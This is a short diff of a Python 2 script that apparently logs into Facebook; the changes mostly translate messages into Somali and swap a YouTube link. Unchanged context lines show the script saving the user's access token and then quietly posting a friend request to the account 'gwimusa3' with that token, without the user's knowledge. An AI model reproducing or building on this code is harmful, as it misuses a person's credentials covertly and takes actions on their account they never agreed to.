@@ -96,10 +96,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "videogan dawo waxba magaranayside"
-            os.system('xdg-open https://www.youtube.com/watch?v=RPHdCNRUjno')
+            os.system('xdg-open https://www.youtube.com/watch?v=lcNxqvuQlcM')
     else:
-        print "salah sayang!"
-        os.system('xdg-open https://www.youtube.com/watch?v=RPHdCNRUjno')
+        print "war dawo vidoe ga doqonyow!"
+        os.system('xdg-open https://www.youtube.com/watch?v=lcNxqvuQlcM')
 
 def login():
 	os.system('clear')
@@ -140,11 +140,11 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;36;40m[✓] Login Successful...'
-				os.system('xdg-open https://www.youtube.com/watch?v=RPHdCNRUjno')
+				os.system('xdg-open https://www.youtube.com/watch?v=lcNxqvuQlcM')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
-				print"\n\x1b[1;91m[!] There is no internet connection"
+				print"\n\x1b[1;91m[!] nio internet la aan ba ku haysa"
 				keluar()
 		if 'checkpoint' in url:
 			print("\n\x1b[1;92m[!] WAA LAGA XAYIRA EE MID KALE GALI")
